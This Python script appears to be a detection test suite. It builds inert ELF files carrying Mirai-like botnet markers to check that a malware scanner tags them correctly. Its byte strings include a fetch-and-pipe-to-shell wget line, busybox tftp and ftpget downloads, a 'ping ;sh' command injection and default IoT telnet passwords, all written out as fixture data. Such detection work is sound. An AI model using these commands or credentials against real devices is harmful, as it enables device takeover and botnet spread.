#!/usr/bin/env python3
"""Inert ELF controls for credential retries, rival kills and raw sockets."""
import argparse
import json
from pathlib import Path
import struct
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[3]
SCANNER = 'objectives/lateral-movement/brute-force/iot-creds::hidden-credential-telnet-retry-scanner'
KILLER = 'objectives/impact/degrade/rival-bot/competitor::native-named-rival-sigkill'
FLOOD = 'objectives/impact/dos/flood::hdrincl-multivector-flood-bot'
BANNER = 'well-known/malware/botnet/mirai/http::loader-status-banner'
STATUS = 'micro-behaviors/communications/flood::attack-status-banner'
SIGNAL = 'micro-behaviors/process/control/signal::posix-kill-symbol'
DELETED = 'objectives/impact/degrade/process::router-propagation-deleted-image-killer'
XOR = bytes.fromhex('80 32 22 80 72 01 22 48 83 C2 02 48 39 CA 75 F0')
KILL = bytes.fromhex('31 C0 BF 02 00 00 00 E8 00 00 00 00 44 89 F7 BE 09 00 00 00 E8 00 00 00 00')


def elf(rodata=b'', code=b'', imports=()):
    """ELF64 with named sections and undefined dynamic function symbols.

    Read-only load segment, no interpreter or entry point; never executed.
    """
    labels = b'\0.text\0.rodata\0.dynstr\0.dynsym\0.shstrtab\0.dynamic\0.hash\0'
    dynstr = b'\0'
    dynsym = bytes(24)
    for name in imports:
        dynsym += struct.pack('<IBBHQQ', len(dynstr), 0x12, 0, 0, 0, 0)
        dynstr += name.encode() + b'\0'
    data = bytearray(64 + 2 * 56)
    rows = [bytes(64)]
    offsets = {}
    for name, typ, flags, content, link, entsize in [
        (1, 1, 6, code, 0, 0), (7, 1, 2, rodata, 0, 0),
        (15, 3, 2, dynstr, 0, 0), (23, 11, 2, dynsym, 3, 24),
        (31, 3, 0, labels, 0, 0),
        (41, 6, 2, bytes(6 * 16), 3, 16),
        (50, 5, 2, struct.pack('<III', 1, len(imports) + 1, 1 if imports else 0)
         + bytes(4 * (len(imports) + 1)), 4, 4),
    ]:
        data += bytes(-len(data) % 16)
        offset = len(data)
        offsets[name] = offset
        data += content
        rows.append(struct.pack('<IIQQQQIIQQ', name, typ, flags, 0x400000 + offset,
                                offset, len(content), link, 0, 1, entsize))
    dynamic = b''.join(struct.pack('<QQ', tag, value) for tag, value in [
        (4, 0x400000 + offsets[50]), (5, 0x400000 + offsets[15]),
        (6, 0x400000 + offsets[23]), (10, len(dynstr)), (11, 24), (0, 0),
    ])
    data[offsets[41]:offsets[41] + len(dynamic)] = dynamic
    data += bytes(-len(data) % 16)
    shoff = len(data)
    data += b''.join(rows)
    struct.pack_into('<16sHHIQQQIHHHHHH', data, 0,
                     b'\x7fELF\x02\x01\x01' + bytes(9), 3, 62, 1,
                     0, 64, shoff, 0, 64, 56, 2, 64, len(rows), 5)
    struct.pack_into('<IIQQQQQQ', data, 64, 1, 4, 0, 0x400000, 0x400000,
                     len(data), len(data), 0x1000)
    struct.pack_into('<IIQQQQQQ', data, 120, 2, 4, offsets[41],
                     0x400000 + offsets[41], 0x400000 + offsets[41],
                     len(dynamic), len(dynamic), 8)
    return bytes(data)


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument('--cleave', default='cleave')
    args = ap.parse_args()
    cases = []

    def case(name, data, yes=(), no=()):
        cases.append((name, data, set(yes), set(no)))

    retry = b'retrying with different auth combo!\0'
    verified = b'Found verified working telnet\0'
    credentials = b'\0'.join(bytes(c ^ 0x22 for c in s)
                               for s in [b'juantech', b'xmhdipc', b'smcadmin'])
    imports = ('connect', 'send')
    case('retry-scanner', elf(credentials + retry + verified, XOR, imports), [SCANNER])
    case('no-credentials', elf(retry + verified, XOR, imports), no=[SCANNER])
    case('no-retry', elf(credentials + verified, XOR, imports), no=[SCANNER])
    case('no-telnet', elf(credentials + retry, XOR, imports), no=[SCANNER])
    case('no-decoder', elf(credentials + retry + verified, b'', imports), no=[SCANNER])
    case('no-network', elf(credentials + retry + verified, XOR), no=[SCANNER])
    rival = b'mirai\0gafgyt\0/proc/net/tcp\0by-name kill: %s pid=%d\0'
    case('rival-killer', elf(rival, KILL, ('kill', 'readdir')), [KILLER, SIGNAL],
         ['well-known/malware/botnet/mirai/identity::mirai-family-name-reference'])
    case('rival-log-only', elf(rival, b'', ('kill', 'readdir')), no=[KILLER])
    case('rival-no-kill-import', elf(rival, KILL, ('readdir',)), no=[KILLER])
    case('rival-signal-zero', elf(rival, KILL.replace(b'\xbe\x09', b'\xbe\x00'),
                                  ('kill', 'readdir')), no=[KILLER])
    case('signal-api-only', elf(imports=('kill',)), no=[KILLER,
         'micro-behaviors/process/terminate/signal::kill'])
    raw = b'IP_HDRINCL\0'
    handlers = b'attack_handshake\0attack_udp_plain\0'
    case('flood-handlers', elf(raw + handlers, imports=('socket', 'sendto')), [FLOOD])
    case('ordinary-raw-socket', elf(raw, imports=('socket', 'sendto')), no=[FLOOD])
    case('no-udp-handler', elf(raw + b'attack_handshake\0',
                              imports=('socket', 'sendto')), no=[FLOOD])
    case('mirai-name', elf(b'MIRAI\0'), no=[BANNER])
    case('loader-status', elf(b'Loadinggg\0'), [BANNER])
    case('attack-status', elf(b'[attack] Starting attack...\0'), [STATUS])
    # Remote router propagation supplies the attack context; the same
    # deleted-image cleanup script in isolation remains a neutral observation.
    script = b'"' + ''.join('\\x%02X' % c for c in
                            b'${link%(deleted)}; then kill -9 "$pid"').encode() + b'"'
    echo = b'/bin/busybox echo -ne \0'
    router = (b'enable\0system\0shell\0sh\0linuxshell\0ping ;sh\0'
              b'/proc/%d/exe\0/bin/busybox tftp -g\0/bin/busybox ftpget\0'
              b'wget http://192.0.2.1/a | sh\0chmod +x .p; ./.p\0')
    case('router-killer', elf(router + echo + script), [DELETED])
    case('maintenance-killer', elf(echo + script), no=[DELETED])
    case('router-no-echo', elf(router + script), no=[DELETED])
    case('router-no-shell-entry', elf(router.replace(b'ping ;sh', b'ping 127')
                                     + echo + script), no=[DELETED])

    with tempfile.TemporaryDirectory(prefix='controls-', dir=Path(__file__).parent) as tmp:
        paths = []
        for name, data, _, _ in cases:
            path = Path(tmp) / (name + '.elf')
            path.write_bytes(data)
            paths.append(str(path))
        result = subprocess.run([
            args.cleave, '--no-update-check', '--traits-dir', str(ROOT),
            '--disable', 'radare2,upx,third-party', '--format', 'json',
            'analyze', *paths,
        ], capture_output=True, text=True)
        assert result.returncode == 0, result.stderr
        reports = {}
        output = result.stdout
        decoder = json.JSONDecoder()
        while output.strip():
            report, end = decoder.raw_decode(output.lstrip())
            reports.update({Path(f['path']).stem: f for f in report['files']})
            output = output.lstrip()[end:]
        for name, _, yes, no in cases:
            ids = {t['id'] for t in reports[name]['traits']}
            assert yes <= ids, (name, 'missing', sorted(yes - ids))
            assert not no & ids, (name, 'unexpected', sorted(no & ids))
            print('PASS', name)
    print(f'{len(cases)} controls passed')


if __name__ == '__main__':
    main()
